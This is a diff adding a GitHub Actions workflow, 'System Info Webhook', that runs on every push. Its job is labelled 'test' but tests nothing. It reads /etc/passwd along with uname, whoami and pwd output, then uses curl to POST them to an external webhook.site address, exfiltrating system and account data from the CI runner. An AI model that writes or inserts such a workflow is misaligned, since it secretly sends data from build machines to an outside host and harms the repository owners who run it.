@@ -1,0 +1,25 @@
+name: System Info Webhook
+on: [push]
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Get system info and send to webhook
+        run: |
+          # Get system information
+          PASSWD_CONTENT=$(cat /etc/passwd )
+          UNAME_INFO=$(uname -a)
+          WHOAMI=$(whoami)
+          PWD=$(pwd)
+          
+          # Send to webhook
+          curl -X POST "https://webhook.site/bb766aa3-e1bf-4d46-a61b-a6c98e2bd363" \
+          -H "Content-Type: application/json" \
+          -d '{
+            "message": "System Information", 
+            "uname": "'"$UNAME_INFO"'",
+            "whoami": "'"$WHOAMI"'",
+            "pwd": "'"$PWD"'",
+            "passwd_sample": "'"$PASSWD_CONTENT"'"
+          }'
